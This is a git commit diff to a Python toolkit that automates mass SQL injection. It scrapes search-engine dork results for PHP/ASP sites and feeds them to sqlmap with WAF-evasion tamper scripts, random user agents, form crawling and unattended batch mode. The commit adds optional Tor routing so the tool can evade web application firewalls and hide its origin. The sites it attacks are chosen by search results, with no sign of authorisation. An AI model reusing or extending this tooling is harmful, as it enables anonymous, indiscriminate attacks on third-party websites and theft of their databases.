ef9934eab5a7fa5ea64cfda96ccb399c4e4432ab
xinghuacai <1731977663@qq.com>
2016-01-28 22:32:24 +0800

    add 'POST' sqli function and smart to choose 'tor' or not.

--- MyToolKit.py
+++ MyToolKit.py
@@ -8,6 +8,14 @@ import os
 import re 
 import mysqlmap
 while(True):
+	print('''do you want use 'tor' service in your sqli action? sometimes when your network is not very well,
+is not a good idea to use tor,but when your targets has waf,use tor is better.
+input Y(y) or N(n) default [Y]:>''',end='')
+	choose=input()
+	if choose=='N' or choose=='n':
+		bool_tor=False
+	else:
+		bool_tor=True
 	print('''there are several functions blew,chose the number of the list you want the script to do:
 1.for exp execution to the targets,your targets file should include the urls like "http://xxx.xxx.xxx/xx/" or "https://xxx.xxx.xxx/ etc."
 2.for sqli by mygoogle to search the domains in one ip
@@ -39,25 +47,25 @@ input your number here:''',end='')
 		num=int(input())
 		if num==1:
 			os.system("/root/myenv2/bin/python3.5m my_GoogleScraper_bing_domain.py -f %s" % targets)
-			mysqlmap.sqlmap_craw("GoogleScraper_bing_origin_http_domain_url_list.txt")
+			mysqlmap.sqlmap_craw("GoogleScraper_bing_origin_http_domain_url_list.txt",bool_tor)
 			try:
-				mysqlmap.sqlmap_craw("bing_origin_http_domain_url_list.txt")
+				mysqlmap.sqlmap_craw("bing_origin_http_domain_url_list.txt",bool_tor)
 			except:
 				pass
 		if num==2:
 			os.system("/root/myenv2/bin/python3.5m my_GoogleScraper_bing_domain.py -f %s" % targets)
-			mysqlmap.sqlmap_g_nohuman("GoogleScraper_bing_http_domain_list.txt")
+			mysqlmap.sqlmap_g_nohuman("GoogleScraper_bing_http_domain_list.txt",bool_tor)
 			try:
-				mysqlmap.sqlmap_g_nohuman("bing_http_domain_list.txt")	
+				mysqlmap.sqlmap_g_nohuman("bing_http_domain_list.txt",bool_tor)	
 			except:
 				pass
 		if num==3:
 			os.system("/root/myenv2/bin/python3.5m my_GoogleScraper_bing_domain.py -f %s" % targets)
 			print("1111111111111111111success here")
-			mysqlmap.sqlmap_g_human("GoogleScraper_bing_http_domain_list.txt")
+			mysqlmap.sqlmap_g_human("GoogleScraper_bing_http_domain_list.txt",bool_tor)
 			print("2222222222222222222success here")
 			try:
-				mysqlmap.sqlmap_g_human("bing_http_domain_list.txt")
+				mysqlmap.sqlmap_g_human("bing_http_domain_list.txt",bool_tor)
 			except:
 				pass
 		elif num!=1 and num!=2 and num!=3:
@@ -76,15 +84,15 @@ input your number here:''',end='')
 		num=int(input())
 		if num==1:
 			os.system("/usr/bin/python2.7 my_bing_domains_v1_alone.py %s" % targets)
-			mysqlmap.sqlmap_craw("bing_origin_http_domain_url_list.txt")
+			mysqlmap.sqlmap_craw("bing_origin_http_domain_url_list.txt",bool_tor)
 		if num==2:
 			os.system("/usr/bin/python2.7 my_bing_domains_v1_alone.py %s" % targets)
 			print("/usr/bin/python2.7 my_bing_domains_v1_alone.py -f %s" % targets)
 			print("8888888888888success here")
-			mysqlmap.sqlmap_g_nohuman("bing_http_domain_list.txt")
+			mysqlmap.sqlmap_g_nohuman("bing_http_domain_list.txt",bool_tor)
 		if num==3:
 			os.system("/usr/bin/python2.7 my_bing_domains_v1_alone.py %s" % targets)
-			mysqlmap.sqlmap_g_human("bing_http_domain_list.txt")			
+			mysqlmap.sqlmap_g_human("bing_http_domain_list.txt",bool_tor)
 		elif num!=1 and num!=2 and num!=3:
 			print("choose number wrong")
 
@@ -93,6 +101,6 @@ input your number here:''',end='')
 		print('''input your keyword you want google to search>''',end='')
 		keyword=input()		
 		os.system('''/root/myenv/bin/python3.5 easy_search.py "%s"''' % keyword)
-		mysqlmap.sqlmap_g_human("GoogleScraper_origin_http_domain_url_list.txt")
+		mysqlmap.sqlmap_g_human("GoogleScraper_origin_http_domain_url_list.txt",bool_tor)
 		pass
 
--- mysqlmap.py
+++ mysqlmap.py
@@ -11,16 +11,24 @@ def static_sqli(url):
 	#re.search("",url)
 	pass
 
-def sqlmap_g_nohuman(http_url_or_file):
+def sqlmap_g_nohuman(http_url_or_file,tor_or_not):
 	#this function use sqlmap's "-g" option to find sqli urls,but this "-g"
 	#option can only get 100 results due to google api restriction,but in 
 	#this mode,there is no need for us human to handle any situation.
 	if re.match("(http://)|(https://)",http_url_or_file):
 		domain_url=http_url_or_file[7:] if re.match("(http://)",http_url_or_file) else http_url_or_file[8:]
-		sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -g "site:%s inurl:php|asp" --delay 2 --smart --batch -v 3 --threads 4 --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode''' % (domain_url,http_url_or_file)
+		sqlmap_string='''/usr/share/sqlmap/sqlmap.py -g "site:%s inurl:php|asp" --delay 2 --smart --batch -v 4 --threads 4 --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3''' % (domain_url,http_url_or_file)
+		forms_sqlmap_string='''/usr/share/sqlmap/sqlmap.py -g "site:%s inurl:php|asp" --delay 2 --smart --batch -v 4 --threads 4 --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms''' % (domain_url,http_url_or_file)
+		tor_sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -g "site:%s inurl:php|asp" --delay 2 --smart --batch -v 4 --threads 4 --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3''' % (domain_url,http_url_or_file)
+		tor_forms_sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -g "site:%s inurl:php|asp" --delay 2 --smart --batch -v 4 --threads 4 --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms''' % (domain_url,http_url_or_file)
 		print("sqlmap_string is:%s" % sqlmap_string)
 		#sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -g site:%s allinurl:"php"|"php page="|"php id="|"php tid="|"php pid="|"php cid="|"php path="|"php cmd="|"php file="|"php cartId="|"php bookid="|"php num="|"php idProduct="|"php ProdId="|"php idCategory="|"php intProdID="|"cfm storeid="|"php catid="|"php cart_id="|"php order_id="|"php catalogid="|"php item="|"php title="|"php CategoryID="|"php action="|"php newsID="|"php newsid="|"php product_id="|"php cat="|"php parent_id="|"php view="|"php itemid="'''
-		os.system("/usr/bin/python2.7 %s" % sqlmap_string)
+		if tor_or_not==False:
+			os.system("/usr/bin/python2.7 %s" % sqlmap_string)
+			os.system("/usr/bin/python2.7 %s" % forms_sqlmap_string)
+		elif tor_or_not==True:
+			os.system("/usr/bin/python2.7 %s" % tor_sqlmap_string)
+			os.system("/usr/bin/python2.7 %s" % tor_forms_sqlmap_string)
 
 	else:
 		fp=open(http_url_or_file,"r+")
@@ -28,29 +36,54 @@ def sqlmap_g_nohuman(http_url_or_file):
 		fp.close()
 		for each in all_urls:			
 			domain_url=each[7:] if re.match("(http://)",each) else each[8:]
-			sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -g "site:%s inurl:php|asp" --delay 2 --smart --batch -v 3 --threads 4 --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode''' % (domain_url,each)
+			sqlmap_string='''/usr/share/sqlmap/sqlmap.py -g "site:%s inurl:php|asp" --delay 2 --smart --batch -v 4 --threads 4 --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3''' % (domain_url,each)
+			forms_sqlmap_string='''/usr/share/sqlmap/sqlmap.py -g "site:%s inurl:php|asp" --delay 2 --smart --batch -v 4 --threads 4 --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms''' % (domain_url,each)
+			tor_sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -g "site:%s inurl:php|asp" --delay 2 --smart --batch -v 4 --threads 4 --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3''' % (domain_url,each)
+			tor_forms_sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -g "site:%s inurl:php|asp" --delay 2 --smart --batch -v 4 --threads 4 --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms''' % (domain_url,each)
 			print("sqlmap_string is:%s" % sqlmap_string)
 			#sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -g site:%s allinurl:"php"|"php page="|"php id="|"php tid="|"php pid="|"php cid="|"php path="|"php cmd="|"php file="|"php cartId="|"php bookid="|"php num="|"php idProduct="|"php ProdId="|"php idCategory="|"php intProdID="|"cfm storeid="|"php catid="|"php cart_id="|"php order_id="|"php catalogid="|"php item="|"php title="|"php CategoryID="|"php action="|"php newsID="|"php newsid="|"php product_id="|"php cat="|"php parent_id="|"php view="|"php itemid="'''
-			os.system("/usr/bin/python2.7 %s" % sqlmap_string)
+			if tor_or_not==False:
+				os.system("/usr/bin/python2.7 %s" % sqlmap_string)
+				os.system("/usr/bin/python2.7 %s" % forms_sqlmap_string)
+			elif tor_or_not==True:
+				os.system("/usr/bin/python2.7 %s" % tor_sqlmap_string)
+				os.system("/usr/bin/python2.7 %s" % tor_forms_sqlmap_string)
 
-def sqlmap_craw(origin_http_url_or_file):
+def sqlmap_craw(origin_http_url_or_file,tor_or_not):
 	#this function use sqlmap's "--crawl" option to find sqli urls.
 	if re.match("(http://)|(https://)",origin_http_url_or_file):
 		origin_http_url=re.sub(r'(\s)',"",origin_http_url_or_file)
-		sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -u "%s" --crawl=3 --delay 2 --smart -v 3 --threads 4 --batch --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode''' % (origin_http_url,origin_http_url)
+		sqlmap_string='''/usr/share/sqlmap/sqlmap.py -u "%s" --crawl=3 --delay 2 --smart -v 4 --threads 4 --batch --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3''' % (origin_http_url,origin_http_url)
+		forms_sqlmap_string='''/usr/share/sqlmap/sqlmap.py -u "%s" --crawl=3 --delay 2 --smart -v 4 --threads 4 --batch --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms''' % (origin_http_url,origin_http_url)
+		tor_sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -u "%s" --crawl=3 --delay 2 --smart -v 4 --threads 4 --batch --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3''' % (origin_http_url,origin_http_url)
+		tor_forms_sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -u "%s" --crawl=3 --delay 2 --smart -v 4 --threads 4 --batch --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms''' % (origin_http_url,origin_http_url)
 		print("sqlmap_string is:%s" % sqlmap_string)
+		if tor_or_not==False:
+			os.system("/usr/bin/python2.7 %s" % sqlmap_string)
+			os.system("/usr/bin/python2.7 %s" % forms_sqlmap_string)
+		elif tor_or_not==True:
+			os.system("/usr/bin/python2.7 %s" % tor_sqlmap_string)
+			os.system("/usr/bin/python2.7 %s" % tor_forms_sqlmap_string)
 	else:
 		fp=open(origin_http_url_or_file,"r+")
 		all_urls=fp.readlines()
 		fp.close()
 		for each in all_urls:	
 			origin_http_url=re.sub(r'(\s)',"",each)		
-			sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -u "%s" --crawl=3 --delay 2 --smart -v 3 --threads 4 --batch --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode''' % (origin_http_url,origin_http_url)
+			sqlmap_string='''/usr/share/sqlmap/sqlmap.py -u "%s" --crawl=3 --delay 2 --smart -v 4 --threads 4 --batch --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3''' % (origin_http_url,origin_http_url)
+			forms_sqlmap_string='''/usr/share/sqlmap/sqlmap.py -u "%s" --crawl=3 --delay 2 --smart -v 4 --threads 4 --batch --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms''' % (origin_http_url,origin_http_url)
+			tor_sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -u "%s" --crawl=3 --delay 2 --smart -v 4 --threads 4 --batch --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3''' % (origin_http_url,origin_http_url)
+			tor_forms_sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -u "%s" --crawl=3 --delay 2 --smart -v 4 --threads 4 --batch --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms''' % (origin_http_url,origin_http_url)
 			print("sqlmap_string is %s" % sqlmap_string)
-			os.system("/usr/bin/python2.7 %s" % sqlmap_string)
+			if tor_or_not==False:
+				os.system("/usr/bin/python2.7 %s" % sqlmap_string)
+				os.system("/usr/bin/python2.7 %s" % forms_sqlmap_string)
+			elif tor_or_not==True:
+				os.system("/usr/bin/python2.7 %s" % tor_sqlmap_string)
+				os.system("/usr/bin/python2.7 %s" % tor_forms_sqlmap_string)
 
 
-def sqlmap_g_human(http_url_or_file):
+def sqlmap_g_human(http_url_or_file,tor_or_not):
 	#this function use myGoogleScraper to search google dork to get the full
 	#urls,in this mode,we need input the yanchengma by human,not robot,coz 
 	#sqlmap's -g option can only get the former 100 results,this function will
@@ -62,9 +95,17 @@ def sqlmap_g_human(http_url_or_file):
 		#search_url_list=blew expression
 		#easy_search.myGoogleScraper_get_urls_from_query(query,"GoogleScraper_origin_http_domain_url_list")
 		os.system('''/root/myenv/bin/python3.5 easy_search.py "%s"''' % query)#here myenv/python3.5 is the selenium changed version
-		sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -m GoogleScraper_origin_http_domain_url_list.txt -v 3 --delay 2 --smart --batch --threads 4 --random-agent --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode'''
+		sqlmap_string='''/usr/share/sqlmap/sqlmap.py -m GoogleScraper_origin_http_domain_url_list.txt -v 4 --delay 2 --smart --batch --threads 4 --random-agent --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3'''
+		forms_sqlmap_string='''/usr/share/sqlmap/sqlmap.py -m GoogleScraper_origin_http_domain_url_list.txt -v 4 --delay 2 --smart --batch --threads 4 --random-agent --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms'''
+		tor_sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -m GoogleScraper_origin_http_domain_url_list.txt -v 4 --delay 2 --smart --batch --threads 4 --random-agent --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3'''
+		tor_forms_sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -m GoogleScraper_origin_http_domain_url_list.txt -v 4 --delay 2 --smart --batch --threads 4 --random-agent --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms'''
 		print("sqlmap_string is:%s" % sqlmap_string)
-		os.system("/usr/bin/python2.7 %s" % sqlmap_string)
+		if tor_or_not==False:
+			os.system("/usr/bin/python2.7 %s" % sqlmap_string)
+			os.system("/usr/bin/python2.7 %s" % forms_sqlmap_string)
+		elif tor_or_not==True:
+			os.system("/usr/bin/python2.7 %s" % tor_sqlmap_string)
+			os.system("/usr/bin/python2.7 %s" % tor_forms_sqlmap_string)
 	else:
 		#print(666666661111111)
 		try:
@@ -85,11 +126,19 @@ def sqlmap_g_human(http_url_or_file):
 			#search_url_list=blew expression
 			#easy_search.myGoogleScraper_get_urls_from_query(query,"GoogleScraper_origin_http_domain_url_list")
 			os.system('''/root/myenv/bin/python3.5 easy_search.py "%s"''' % query)#here myenv/python3.5 is the selenium changed version
-		sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -m GoogleScraper_origin_http_domain_url_list.txt -v 3 --delay 2 --smart --batch --threads 4 --random-agent --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode'''
+		sqlmap_string='''/usr/share/sqlmap/sqlmap.py -m GoogleScraper_origin_http_domain_url_list.txt -v 4 --delay 2 --smart --batch --threads 4 --random-agent --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3'''
+		forms_sqlmap_string='''/usr/share/sqlmap/sqlmap.py -m GoogleScraper_origin_http_domain_url_list.txt -v 4 --delay 2 --smart --batch --threads 4 --random-agent --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms'''
+		tor_sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -m GoogleScraper_origin_http_domain_url_list.txt -v 4 --delay 2 --smart --batch --threads 4 --random-agent --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3'''
+		tor_forms_sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -m GoogleScraper_origin_http_domain_url_list.txt -v 4 --delay 2 --smart --batch --threads 4 --random-agent --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms'''
 		print("sqlmap_string is:%s" % sqlmap_string)
-		os.system("/usr/bin/python2.7 %s" % sqlmap_string)
+		if tor_or_not==False:
+			os.system("/usr/bin/python2.7 %s" % sqlmap_string)
+			os.system("/usr/bin/python2.7 %s" % forms_sqlmap_string)
+		elif tor_or_not==True:
+			os.system("/usr/bin/python2.7 %s" % tor_sqlmap_string)
+			os.system("/usr/bin/python2.7 %s" % tor_forms_sqlmap_string)
 
 def main():
-	sqlmap_g_human("targets.txt")
+	sqlmap_g_human("targets.txt",False)
 if __name__ == '__main__':
 	main()
